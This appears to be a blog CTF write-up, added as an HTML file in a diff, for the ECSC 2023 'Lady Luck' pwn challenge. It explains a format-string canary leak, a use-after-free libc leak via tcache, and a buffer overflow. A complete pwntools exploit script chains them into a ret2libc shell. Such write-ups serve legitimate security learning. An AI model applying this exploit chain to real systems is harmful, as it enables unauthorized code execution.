@@ -1,0 +1,242 @@
+<!doctypehtml>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>ECSC 2023: Lady Luck</title>
+
+  <meta name="viewport"content="width=device-width,initial-scale=1">
+  <meta http-equiv="X-UA-Compatible"content="ie=edge">
+  <meta property="og:title"content="uhg's corner">
+  <meta property="og:image"content="https://i.ibb.co/4pRxk6j/trashthumbsup-c-websitethumb.png">
+  <meta property="og:description"content="vulnerability resarch, exploits and cve, ctf blog">
+  <meta property="og:url"content="https://ultimatehg.github.io">
+  <meta property="og:image:width"content="1200">
+  <meta property="og:image:height"content="627">
+  <meta property="og:type"content="website"> 
+
+  <link rel="shortcut icon"href="../assets/favicon.ico"type="image/x-icon">
+  <link rel="preload"href="../styles/article.css"as="style">
+  <link rel="stylesheet"href="../styles/article.css">
+</head>
+<body>
+  <header id="top-container"role="navigation">
+    <nav>
+  <a class="logo-link"href="/">
+    <h1>uhg's corner</h1>
+    <span>ctf_writeups | security_research | cs_stuff</span>
+  </a>
+  <small>
+    <a id="about"class="info-link"href="/about.html">👀About</a> /
+    <a id="works"class="info-link"href="/works.html">🔥Works</a> /
+    <a id="articles"class="info-link"href="/articles.html">📚Articles</a>
+  </small>
+</nav>
+
+  </header>
+  <main id="main-container">
+    <article id="article-container">
+      <h1 id="article-title">
+        ECSC 2023: Lady Luck
+      </h1>
+      
+        <h2 id="article-subtitle">
+          ECSC 2023 Day 3: Pwn
+        </h2>
+      
+      <time id="article-date">
+        2023.11.02
+      </time>
+      <section id="article-content-container">
+        <details><summary>Table of Contents</summary>
+<p><div class="table-of-contents"><ul><li><ul><li><a href="#foreword">Foreword</a></ul><li><a href="#lady-luck">Lady Luck</a><ul><li><a href="#afterword">Afterword</a></ul></ul></div><p></p>
+</details>
+<h2 id="foreword"tabindex="-1">Foreword</h2>
+<p>This challenge was a lot more interesting than those on Day 1. It featured a use-after-free to leak libc address, though the challenge overall is still a ret2libc challenge.</p>
+<h1 id="lady-luck"tabindex="-1">Lady Luck</h1>
+<p>We run <code>checksec</code> on the binary:</p>
+<pre class="hljs"><code>[*] <span class="hljs-string">&#x27;/mnt/e/ctf_archive/ecsc2023/d3/ladyluck/lady_luck&#x27;</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b<span class="hljs-string">&#x27;./glibc/&#x27;</span>
+</code></pre>
+<p>It has everything enabled. This means we potentially need to watch out for the canary as well as the PIE offset.</p>
+<p>We open the binary in IDA and see that it’s a menu based application.</p>
+<pre class="hljs"><code>buf = <span class="hljs-number">0</span>;
+v5 = <span class="hljs-number">0</span>;
+fwrite(&amp;unk_2508, <span class="hljs-number">1uLL</span>, <span class="hljs-number">0x79</span>uLL, <span class="hljs-built_in">stdout</span>);
+option1 = read_num();
+<span class="hljs-keyword">if</span> ( !option1 || option1 &gt; <span class="hljs-number">3</span> )
+{
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nAre you trying to cheat Lady Luck?!\n&quot;</span>);
+  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1312</span>);
+}
+fwrite(&amp;unk_25B0, <span class="hljs-number">1uLL</span>, <span class="hljs-number">0x66</span>uLL, <span class="hljs-built_in">stdout</span>);
+read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">6uLL</span>);
+fflush(<span class="hljs-built_in">stdin</span>);
+<span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;buf, <span class="hljs-string">&quot;fr33c01n5f0r3v3ry0n3&quot;</span>) )
+{
+  coins = <span class="hljs-number">0x174876E7FF</span>LL;
+}
+<span class="hljs-keyword">else</span>
+{
+  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;\n%s[-] Sorry, this is not correct: &quot;</span>, <span class="hljs-string">&quot;\x1B[1;31m&quot;</span>);
+  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;buf);
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[1;34m&quot;</span>);
+}
+menu();
+</code></pre>
+<p>There is a format string exploit with an input of up to length 6 in <code>main()</code> before it goes into menu. We can thus use it to leak the canary <code>%8$p</code>.</p>
+<p>Decompiling <code>menu()</code> and all its subfunctions, we find out that <code>buy_pots()</code> restricts the potions you can buy to a maximum size of <code>0x82</code>.</p>
+<pre class="hljs"><code>fwrite(<span class="hljs-string">&quot;\nml: &quot;</span>, <span class="hljs-number">1uLL</span>, <span class="hljs-number">5uLL</span>, <span class="hljs-built_in">stdout</span>);
+psize = read_num();
+<span class="hljs-keyword">if</span> ( psize &lt;= <span class="hljs-number">0x82</span> &amp;&amp; psize )
+{
+  <span class="hljs-keyword">if</span> ( check_coins(<span class="hljs-number">20</span> * psize) )
+    coins -= <span class="hljs-number">20</span> * psize;
+  fwrite(<span class="hljs-string">&quot;\nSlot to place it: &quot;</span>, <span class="hljs-number">1uLL</span>, <span class="hljs-number">0x13</span>uLL, <span class="hljs-built_in">stdout</span>);
+  pindex = read_num();
+  <span class="hljs-keyword">if</span> ( pindex &gt; <span class="hljs-number">9</span> )
+    <span class="hljs-keyword">goto</span> LABEL_13;
+  red_pots[pindex] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(psize);
+  <span class="hljs-built_in">strcpy</span>(red_pots[pindex], <span class="hljs-string">&quot;Lucky Red    potion x1&quot;</span>);
+}
+</code></pre>
+<p><code>sell_pots()</code> calls <code>free()</code> but does not reset the pointer, which allows for a use-after-free or related bugs.</p>
+<pre class="hljs"><code><span class="hljs-built_in">free</span>(red_pots[index]);
+<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;%s\n[+] Sold! You got back 20 coins!%s\n\n&quot;</span>, <span class="hljs-string">&quot;\x1B[1;32m&quot;</span>, <span class="hljs-string">&quot;\x1B[1;34m&quot;</span>);
+coins += <span class="hljs-number">20LL</span>;
+</code></pre>
+<p><code>show_inventory()</code> will list out everything in the inventory, <em>including the freed elements in the array</em> due to the pointer not being set to null after <code>free()</code> (use-after-free!). This can be used to leak whatever we can get by calling <code>sell_pots()</code>.</p>
+<pre class="hljs"><code><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0LL</span>; i &lt;= <span class="hljs-number">9</span>; ++i )
+{
+  <span class="hljs-keyword">if</span> ( red_pots[i] )
+    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;Slot [%d]: %s\n&quot;</span>, i, red_pots[i]);
+  <span class="hljs-keyword">else</span>
+    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;Slot [%d]: Empty\n&quot;</span>, i);
+}
+</code></pre>
+<p><code>discount_code()</code> defines an input buffer of length <code>0x80</code> but allows the user to input up to <code>0xB7</code> bytes with <code>fgets()</code>, which allows for buffer overflow.</p>
+<pre class="hljs"><code><span class="hljs-built_in">memset</span>(y, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>);
+fwrite(
+<span class="hljs-string">&quot;\nI will tell you the lucky phrase for your next purchase, but you need to give me a good reason why: \n\n&quot;</span>,
+<span class="hljs-number">1uLL</span>,
+<span class="hljs-number">0x67</span>uLL,
+<span class="hljs-built_in">stdout</span>);
+fgets(y, <span class="hljs-number">0xB7</span>, <span class="hljs-built_in">stdin</span>);
+fwrite(<span class="hljs-string">&quot;Your code is: [fr33c01n5f0r3v3ry0n3]\n&quot;</span>, <span class="hljs-number">1uLL</span>, <span class="hljs-number">0x25</span>uLL, <span class="hljs-built_in">stdout</span>);
+</code></pre>
+<p>We can leak the libc address by buying 8 potions of length <code>0x82</code> then selling all of them. This is due to the way the tcache bins work (7 same-sized bins), and because of the use-after-free caused by the bad <code>free()</code> usage, we can leak the pointer to the 8th freed bin which would point to the main arena.</p>
+<p>We still need to keep the top chunk in place to prevent coalescing, so theoretically we need to buy index 0-8 and sell index 0-7, then show index 7. We see a <code>0x7f</code> byte in gdb which tells we leaked some address in libc (since it points to the main arena). We set a breakpoint at <code>show_inventory()</code> and see our leaked address. Then we can simply <code>xinfo</code> to find the static offset to libc base, which is <code>0x219ce0</code>.</p>
+<p>Chaining everything together, we have:</p>
+<ol>
+<li>Leak canary with fsb</li>
+<li>Leak libc with <code>buy_pots()</code>, <code>sell_pots()</code> and <code>show_inventory()</code></li>
+<li>Buffer overflow and ret2libc</li>
+</ol>
+<p>We can automate the process with pwntools:</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> exploit <span class="hljs-keyword">import</span> *
+
+<span class="hljs-comment"># set exploit source, context binary, context log_level, libc</span>
+elf = context.binary = ELF(<span class="hljs-string">&quot;./lady_luck&quot;</span>, checksec=<span class="hljs-literal">False</span>)
+<span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span>
+libc = ELF(<span class="hljs-string">&quot;./glibc/libc.so.6&quot;</span>)
+
+<span class="hljs-comment"># Run binary 1st time</span>
+p = exploit_source(<span class="hljs-string">&quot;./lady_luck&quot;</span>, <span class="hljs-string">&quot;localhost&quot;</span>, gdbscript=<span class="hljs-string">&quot;b show_inventory&quot;</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">sell</span>(<span class="hljs-params">n</span>):
+	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)
+	p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-built_in">str</span>(n))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">n</span>):
+	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)
+	p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x82</span>))
+	p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-built_in">str</span>(n))
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">inventory</span>():
+	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)
+
+<span class="hljs-comment"># Leak canary</span>
+p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">&quot;1&quot;</span>)
+p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)
+p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>, <span class="hljs-string">&quot;%8$p&quot;</span>)
+p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)
+canary = <span class="hljs-built_in">int</span>(p.recvline(), <span class="hljs-number">16</span>)
+info(<span class="hljs-string">f&quot;<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(canary) =}</span>&quot;</span>)
+
+p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)
+
+<span class="hljs-comment"># allocate 9 bins, free 8 to fill up tcache and get a pointer to the main arena on bin #8</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
+	buy(i)
+
+p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):
+	sell(i)
+
+<span class="hljs-comment"># leak main arena address, calcullate libc base</span>
+inventory()
+
+p.recvuntil(<span class="hljs-string">&quot;[7]: &quot;</span>)
+libc.address = u64(p.recvline().rstrip(<span class="hljs-string">b&#x27;\n&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x219ce0</span>
+success(<span class="hljs-string">f&quot;<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(libc.address) =}</span>&quot;</span>)
+
+<span class="hljs-comment"># perform bof and ret2libc</span>
+p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>)
+
+rop = ROP(libc)
+
+rop.raw(rop.ret)
+rop.system(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))
+
+payload = flat({<span class="hljs-number">0x88</span>: p64(canary), <span class="hljs-number">0x90</span>: p64(<span class="hljs-number">0</span>) + rop.chain()})
+
+p.sendafter(<span class="hljs-string">&quot;:&quot;</span>, payload)
+
+p.interactive()
+</code></pre>
+<p><code>cat flag.txt</code> for the flag.</p>
+<h2 id="afterword"tabindex="-1">Afterword</h2>
+<p>The most fun challenge out of all the rest because of the different layers that went into this, from leaking canary to getting a libc address, before finally sending the final payload to pop shell. Honestly I think it would’ve been easier if I had stronger knowledge on tcache and bins, but nonetheless it was kinda fun.</p>
+<p>Throughout the competition, huge thanks to all my teammates for working tirelessly and especially <a href="https://enigmatrix.me">enigmatrix</a> for his guidance with solving the pwn challenges.</p>
+<p>Thanks for reading!</p>
+
+      </section>
+      <section id="article-navigation">
+        
+          <div class="article-navigation-item article-navigation-next">
+            <a href="/article/18.html">
+              <div class="article-navigation-arrow article-navigation-next">＜</div>
+              <div class="article-navigation-content article-navigation-next">
+                <p class="article-navigation-title">[Blog] ECSC 2023: Recap</p>
+                <p class="article-navigation-subtitle">A blog post on my experience</p>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="article-navigation-item article-navigation-prev">
+            <a href="/article/16.html">
+              <div class="article-navigation-arrow article-navigation-prev">＞</div>
+              <div class="article-navigation-content article-navigation-prev">
+                <p class="article-navigation-title">ECSC 2023: Flux Capacitor</p>
+                <p class="article-navigation-subtitle">ECSC 2023 Day 1: Pwn</p>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      <section id="article-list-button-container">
+        <a href="/articles.html">
+          <div id="article-list-button">📚</div>
+        </a>
+      </section>
+    </article>
+  </main>
+
+
